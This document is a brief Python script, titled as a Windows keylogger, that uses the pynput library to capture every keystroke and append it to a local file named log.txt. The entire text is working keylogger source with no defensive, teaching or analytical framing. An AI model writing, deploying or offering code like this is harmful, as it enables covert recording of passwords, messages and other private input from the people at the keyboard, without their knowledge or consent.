# KeyLogger for Windows using Python

from pynput.keyboard import Listener

def log_keystroke(key):
    key = str(key).replace("'", "")

    if len(key) > 1:
        key = '[' + key + ']'

    with open("log.txt", 'a') as file:
        file.write(key)


with Listener(on_press = log_keystroke) as l:
    l.join()
